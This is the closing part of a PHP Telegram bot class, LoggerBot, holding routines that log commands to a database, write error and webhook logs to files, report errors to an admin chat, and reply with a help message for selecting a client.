            $stmt->execute([$recipient, $userId, $command, $response]);
        } catch (PDOException $e) {
            $this->logError("Failed to log command: " . $e->getMessage());
        }
    }

    private function logError($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] ERROR: $message\n";
        file_put_contents(Config::$ERROR_LOG, $logMessage, FILE_APPEND);
        $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, "Error: $message");
    }

    private function logWebhook($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] WEBHOOK: $message\n";
        file_put_contents(Config::$WEBHOOK_LOG, $logMessage, FILE_APPEND);
    }

    private function sendHelpMessage($recipient, $isClient = false) {
        $message = "No client selected. Use /start or /select <client_id>.";
        if ($isClient) {
            return $message;
        }
        $this->sendClientKeyboard($recipient);
        return $message;
    }
}

$bot = new LoggerBot();
$bot->handleRequest();
?>